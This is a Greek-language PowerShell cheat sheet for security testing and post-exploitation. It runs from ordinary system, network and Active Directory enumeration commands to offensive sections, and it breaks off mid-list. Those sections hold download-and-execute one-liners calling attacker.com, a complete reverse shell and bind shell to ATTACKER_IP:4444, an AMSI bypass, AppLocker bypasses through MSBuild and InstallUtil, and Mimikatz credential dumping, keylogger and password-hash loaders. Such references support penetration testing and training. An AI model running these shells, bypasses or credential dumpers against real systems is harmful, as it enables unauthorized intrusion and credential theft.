# 💻 PowerShell — Οδηγός για ελέγχους ασφάλειας

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

## Πριν ξεκινήσετε

Το **PowerShell** είναι κέλυφος εντολών και γλώσσα αυτοματοποίησης που επεξεργάζεται κυρίως **αντικείμενα**, όχι μόνο κείμενο. Τα **cmdlets** είναι εντολές όπως Get-Process, το **pipeline** διοχετεύει αποτελέσματα στην επόμενη εντολή και οι **properties** ιδιότητες των αντικειμένων. Ένα **script** είναι αρχείο εντολών, συνήθως με επέκταση .ps1.

Ο οδηγός αφορά κυρίως περιβάλλον Windows. Οι διαθέσιμες εντολές και τα modules διαφέρουν μεταξύ Windows PowerShell 5.1 και νεότερου PowerShell, αλλά και ανά εγκατάσταση. Οι εντολές Active Directory προϋποθέτουν αντίστοιχο module και πρόσβαση. Οι χρήστες, τα paths, οι IP, τα φίλτρα και οι τιμές του πρωτοτύπου είναι ενδεικτικά.

Η **Execution Policy** ρυθμίζει όρους φόρτωσης scripts και, σύμφωνα με την [επίσημη περιγραφή της Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies), δεν αποτελεί από μόνη της όριο ασφάλειας. Διαφέρει από τα δικαιώματα λογαριασμού, το **AMSI**, το **AppLocker** και το **Constrained Language Mode**. Το AMSI είναι διεπαφή για ελέγχους περιεχομένου από μηχανισμούς προστασίας, το AppLocker εφαρμόζει κανόνες επιτρεπόμενης εκτέλεσης και το Constrained Language Mode περιορίζει δυνατότητες της γλώσσας. Ένας ισχυρισμός παράκαμψης μιας ρύθμισης δεν αποδεικνύει κατάργηση των υπόλοιπων μηχανισμών.

Οι εντολές και τα literals διατηρούνται από το πρωτότυπο. Ορισμένα μπλοκ είναι αποσπάσματα ή προϋποθέτουν πρόσθετα scripts. Λήψη και εκτέλεση περιεχομένου, αλλαγές μητρώου, διαγραφή αρχείων και έναρξη υπηρεσιών έχουν διαφορετική επίπτωση από μια απλή προβολή πληροφοριών· εξετάστε τη συγκεκριμένη γραμμή πριν από χρήση στο εργαστήριο.

## 📋 Περιεχόμενα

- [Βασικές λειτουργίες](#section-01)
- [Συλλογή πληροφοριών συστήματος](#section-02)
- [Συλλογή πληροφοριών χρηστών](#section-03)
- [Εντολές δικτύου](#section-04)
- [Εργασίες σε αρχεία](#section-05)
- [Διαχείριση διεργασιών και υπηρεσιών](#section-06)
- [Εργασίες στο μητρώο Windows](#section-07)
- [Κατάλογος Active Directory](#section-08)
- [Λήψη και εκτέλεση](#section-09)
- [Κονσόλες με εξερχόμενη σύνδεση (Reverse Shells)](#section-10)
- [Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί](#section-11)
- [Εργαλεία ελέγχου ασφάλειας](#section-12)
- [Παραδείγματα μίας γραμμής](#section-13)
- [Πηγές](#section-14)

---

<a id="section-01"></a>

## 🔰 Βασικές λειτουργίες

### Πολιτική εκτέλεσης PowerShell

Οι αλλαγές πολιτικής έχουν συγκεκριμένη εμβέλεια εφαρμογής (scope) και δεν υπερισχύουν αυτομάτως κάθε κεντρικής πολιτικής ή άλλου μηχανισμού προστασίας.


```powershell
# Έλεγχος τρέχουσας πολιτικής
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Παράδειγμα αλλαγής πολιτικής για την τρέχουσα διεργασία
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Παράδειγμα εκτέλεσης με επιλογή πολιτικής
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Χρήση βοήθειας

```powershell
# Βοήθεια για εντολή
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Ενημέρωση τοπικής βοήθειας
Update-Help

# Προβολή: όλες οι διαθέσιμες εντολές
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Μεταβλητές και τελεστές

```powershell
# Μεταβλητές
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Μεταβλητές περιβάλλοντος
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Τελεστές σύγκρισης
-eq   # Ίσο
-ne   # Διαφορετικό
-gt   # Μεγαλύτερο
-lt   # Μικρότερο
-like # Αντιστοίχιση με χαρακτήρες μπαλαντέρ
-match # Αντιστοίχιση με κανονική έκφραση
```

### Διοχέτευση και φιλτράρισμα δεδομένων

```powershell
# Διοχέτευση αποτελέσματος
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Επιλογή ιδιοτήτων
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Ταξινόμηση
Get-Process | Sort-Object CPU -Descending

# Μορφοποίηση αποτελέσματος
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

<a id="section-02"></a>

## 🔍 Συλλογή πληροφοριών συστήματος

### Πληροφορίες συστήματος

```powershell
# Πληροφορίες υπολογιστή
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# Έκδοση λειτουργικού συστήματος
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Αρχιτεκτονική επεξεργαστή
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Εγκατεστημένες διορθώσεις ασφαλείας
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Εγκατεστημένο λογισμικό

```powershell
# Λογισμικό 64 bit
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Λογισμικό 32 bit σε λειτουργικό 64 bit
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Χρήση WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Συνοπτικός κατάλογος
Get-Package
```

### Μηχανισμοί προστασίας και ασφάλειας

```powershell
# Ανάκτηση: εγκατεστημένο λογισμικό προστασίας
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# Κατάσταση τείχους προστασίας
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Κανόνες τείχους προστασίας
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Εξαιρέσεις Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Προγραμματισμένες εργασίες

```powershell
# Προβολή προγραμματισμένων εργασιών
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Λεπτομέρειες προγραμματισμένης εργασίας
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

<a id="section-03"></a>

## 👤 Συλλογή πληροφοριών χρηστών

### Τοπικοί χρήστες

```powershell
# Τρέχων χρήστης
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Όλοι οι τοπικοί χρήστες
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Πληροφορίες χρήστη
Get-LocalUser Administrator
net user Administrator

# Ομάδες χρήστη
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Προνόμια χρήστη

```powershell
# Τρέχοντα προνόμια
whoami /priv
whoami /all
whoami /groups

# Έλεγχος ιδιότητας διαχειριστή
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Ομάδες

```powershell
# Προβολή: τοπικές ομάδες
Get-LocalGroup
net localgroup

# Μέλη ομάδας
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Συνδεδεμένοι χρήστες

```powershell
# Τρέχουσες συνδέσεις χρηστών
query user
quser
qwinsta

# Πρόσφατες καταχωρίσεις σύνδεσης
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

<a id="section-04"></a>

## 🌐 Εντολές δικτύου

### Ρυθμίσεις δικτύου

```powershell
# Ρυθμίσεις διευθύνσεων IP
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Διαδρομές δικτύου
Get-NetRoute
route print

# Πίνακας αντιστοίχισης διευθύνσεων ARP
Get-NetNeighbor
arp -a
```

### Ανοικτές θύρες και συνδέσεις

```powershell
# Συνδέσεις TCP
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# Στοιχεία τελικών σημείων UDP
Get-NetUDPEndpoint

# Εντοπισμός διεργασίας από θύρα
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Έλεγχοι δικτυακής επικοινωνίας

```powershell
# Έλεγχος απόκρισης με ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Έλεγχος επικοινωνίας με θύρα
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Διερεύνηση διαδρομής πακέτων
Test-NetConnection -ComputerName google.com -TraceRoute

# Ερώτημα DNS
Resolve-DnsName google.com
nslookup google.com
```

### Κοινόχρηστοι πόροι δικτύου

```powershell
# Προβολή κοινόχρηστων πόρων
Get-SmbShare
net share

# Αντιστοίχιση κοινόχρηστου πόρου ως δίσκου
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Προβολή συνδεδεμένων κοινόχρηστων πόρων
Get-SmbConnection
net use

# Πρόσβαση σε κοινόχρηστο πόρο
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

<a id="section-05"></a>

## 📁 Εργασίες σε αρχεία

### Πλοήγηση και κατάλογος αρχείων

```powershell
# Τρέχων κατάλογος
Get-Location
pwd

# Αλλαγή καταλόγου
Set-Location C:\Users
cd C:\Users

# Κατάλογος αρχείων
Get-ChildItem
Get-ChildItem -Force  # Συμπερίληψη κρυφών αρχείων
Get-ChildItem -Recurse
ls
dir

# Προβολή κρυφών αρχείων
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Αναζήτηση αρχείων

```powershell
# Αναζήτηση αρχείων κατά όνομα
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Αναζήτηση κειμένου σε αρχεία
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Αναζήτηση μεγάλων αρχείων
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Αναζήτηση πρόσφατα τροποποιημένων αρχείων
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Ανάγνωση και εγγραφή αρχείων

```powershell
# Ανάγνωση αρχείου
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Εγγραφή σε αρχείο
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Προσθήκη στο τέλος αρχείου

# Αντιγραφή, μετακίνηση ή διαγραφή
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Εναλλακτικές ροές δεδομένων NTFS (ADS)

```powershell
# Προβολή εναλλακτικών ροών δεδομένων
Get-Item file.txt -Stream *
dir /r file.txt

# Ανάγνωση εναλλακτικής ροής δεδομένων
Get-Content file.txt -Stream secret
more < file.txt:secret

# Εγγραφή σε εναλλακτική ροή δεδομένων
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Αφαίρεση εναλλακτικής ροής δεδομένων
Remove-Item file.txt -Stream hidden
```

### Υπολογισμός hashes

```powershell
# Ανάκτηση: hash αρχείου
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Σύγκριση ή επαλήθευση hash
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="section-06"></a>

## ⚙️ Διαχείριση διεργασιών και υπηρεσιών

### Διεργασίες

```powershell
# Εμφάνιση διεργασιών
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Πληροφορίες διεργασίας
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Εκκίνηση διεργασίας
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # Αίτημα εκτέλεσης με δικαιώματα διαχειριστή

# Τερματισμός διεργασίας
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Υπηρεσίες

```powershell
# Προβολή: υπηρεσίες
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Πληροφορίες υπηρεσίας
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Εκκίνηση ή διακοπή υπηρεσιών
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Διαδρομή υπηρεσίας για έλεγχο χρήσης εισαγωγικών
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

<a id="section-07"></a>

## 📝 Εργασίες στο μητρώο Windows

### Ανάγνωση μητρώου

```powershell
# Προβολή κλειδιών μητρώου
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Ανάκτηση: τιμή μητρώου
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Αναζήτηση στο μητρώο
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Εγγραφή στο μητρώο

```powershell
# Δημιουργία κλειδιού
New-Item -Path HKCU:\SOFTWARE\MyKey

# Ορισμός τιμής
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Διαγραφή
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Σχετικές θέσεις μητρώου

```powershell
# Θέσεις αυτόματης εκκίνησης
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Καταχωρίσεις εγκατεστημένου λογισμικού
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM — απαιτούνται κατάλληλα δικαιώματα
# HKLM:\SAM\SAM

# Προστατευμένα στοιχεία LSA
# HKLM:\SECURITY\Policy\Secrets
```

---

<a id="section-08"></a>

## 🏢 Κατάλογος Active Directory

Τα modules AD/GroupPolicy και οι σχετικές προσβάσεις δεν υπάρχουν σε κάθε Windows εγκατάσταση. Φίλτρα όπως AdminCount ή ύπαρξη SPN είναι ενδείξεις προς ερμηνεία, όχι απόδειξη τρεχόντων διαχειριστικών δικαιωμάτων ή συγκεκριμένης ευπάθειας.


### Πληροφορίες domain

```powershell
# Πληροφορίες domain
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Ελεγκτές domain
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Πληροφορίες δάσους καταλόγου
Get-ADForest

# Σχέσεις εμπιστοσύνης
Get-ADTrust -Filter *
```

### Συλλογή πληροφοριών χρηστών AD

```powershell
# Χρήστες domain
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Συγκεκριμένος χρήστης
Get-ADUser -Identity administrator -Properties *

# Χρήστες με συγκεκριμένη ιδιότητα
Get-ADUser -Filter {AdminCount -eq 1}  # Χρήστες που ταιριάζουν στο φίλτρο του παραδείγματος
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Υποψήφιες σχετικές καταχωρίσεις SPN — όχι αυτόματη απόδειξη εκμεταλλευσιμότητας

# Αναζήτηση χρηστών
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Συλλογή πληροφοριών ομάδων AD

```powershell
# Ομάδες καταλόγου
Get-ADGroup -Filter *

# Ομάδα Domain Admins
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Ομάδα Enterprise Admins
Get-ADGroupMember "Enterprise Admins"

# Ομάδες του χρήστη
Get-ADPrincipalGroupMembership username
```

### Συλλογή πληροφοριών υπολογιστών AD

```powershell
# Υπολογιστές καταλόγου
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Ελεγκτές domain
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Διακομιστές
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### Πληροφορίες πολιτικών ομάδας (GPO)

```powershell
# Κατάλογος πολιτικών ομάδας
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# Πληροφορίες πολιτικής ομάδας
Get-GPO -Name "Default Domain Policy"

# Αναφορά πολιτικής ομάδας
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="section-09"></a>

## ⬇️ Λήψη και εκτέλεση

### Λήψη αρχείων

```powershell
# Παράδειγμα Invoke-WebRequest — δεν ταυτίζεται με κάθε χρήση wget ή curl
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# Παράδειγμα WebClient του πρωτοτύπου
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Λήψη περιεχομένου ως συμβολοσειρά
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# Μεταφορά μέσω BITS — δεν συνεπάγεται απουσία καταγραφής
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# Παράδειγμα χρήσης του εργαλείου certutil
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Λήψη και εκτέλεση περιεχομένου στη μνήμη

```powershell
# Εκτέλεση περιεχομένου με Invoke-Expression
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Χρήση μεταβλητής
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Εκτέλεση κωδικοποιημένης εντολής

Η Base64 είναι κωδικοποίηση, όχι κρυπτογράφηση ή απόδειξη αποφυγής ελέγχων. Οι απαιτήσεις κωδικοποίησης της εντολής εξαρτώνται από το περιβάλλον εκτέλεσης.


```powershell
# Κωδικοποίηση εντολής σε Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Εκτέλεση κωδικοποιημένης εντολής
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Παράδειγμα κωδικοποίησης μίας γραμμής
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

<a id="section-10"></a>

## 🔌 Κονσόλες με εξερχόμενη σύνδεση (Reverse Shells)

### Παράδειγμα reverse shell PowerShell

```powershell
# Παράδειγμα κονσόλας με εξερχόμενη σύνδεση TCP
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Παραδείγματα reverse shell μίας γραμμής

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Κονσόλα που περιμένει εισερχόμενη σύνδεση (Bind Shell)

```powershell
# Αναμονή εισερχόμενης σύνδεσης σε θύρα
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="section-11"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

Τα παραδείγματα δεν τεκμηριώνουν καθολική παράκαμψη AMSI, Constrained Language Mode ή AppLocker. Η PowerShell 2.0 και παλαιότερες τεχνικές μπορεί να απουσιάζουν, ενώ κάποια snippets περιέχουν ρητά ελλείποντα τμήματα.


### Παραδείγματα παράκαμψης πολιτικής εκτέλεσης

```powershell
# Παραδείγματα του πρωτοτύπου για αλλαγή τρόπου εκτέλεσης
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Ανάγνωση και διοχέτευση περιεχομένου
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Λήψη περιεχομένου ως συμβολοσειρά — δεν εγγυάται απουσία ιχνών
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### Παραδείγματα τροποποίησης ελέγχων AMSI του πρωτοτύπου

```powershell
# Παράδειγμα του πρωτοτύπου για AMSI — εξαρτάται από έκδοση και προστασίες
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Μετασχηματισμένο παράδειγμα του πρωτοτύπου
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Παράδειγμα τροποποίησης μνήμης υπό συγκεκριμένες συνθήκες
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (το πρωτότυπο δεν περιλαμβάνει πλήρη υλοποίηση)
```

### Ισχυρισμοί παράκαμψης περιορισμένης γλώσσας — προϋποθέσεις

```powershell
# Έλεγχος λειτουργίας γλώσσας
$ExecutionContext.SessionState.LanguageMode

# Παραδείγματα που προτείνει το πρωτότυπο για ConstrainedLanguage — όχι εγγυημένες παρακάμψεις:
# - Παράδειγμα παλαιότερης PowerShell 2.0, μόνο αν υπάρχει
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Παραδείγματα του πρωτοτύπου για AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Έλεγχος κανόνων AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

<a id="section-12"></a>

## 🔫 Εργαλεία ελέγχου ασφάλειας

### PowerSploit

```powershell
# Λήψη
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView — συλλογή πληροφοριών AD
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp — διερεύνηση ανύψωσης δικαιωμάτων
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Το πρωτότυπο προϋποθέτει κώδικα stager από Empire
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Κονσόλα με εξερχόμενη σύνδεση
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Παράδειγμα καταγραφής πληκτρολογήσεων
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

<a id="section-13"></a>

## ⚡ Παραδείγματα μίας γραμμής

### Συλλογή πληροφοριών με εντολές μίας γραμμής

```powershell
# Πληροφορίες συστήματος
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Χρήστες
Get-LocalUser | Select Name,Enabled

# Εγκατεστημένο λογισμικό
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Θύρες σε ακρόαση
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Υπηρεσίες σε λειτουργία
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Προγραμματισμένες εργασίες
schtasks /query /fo TABLE | findstr /v "TaskName"

# Κατάσταση λογισμικού προστασίας
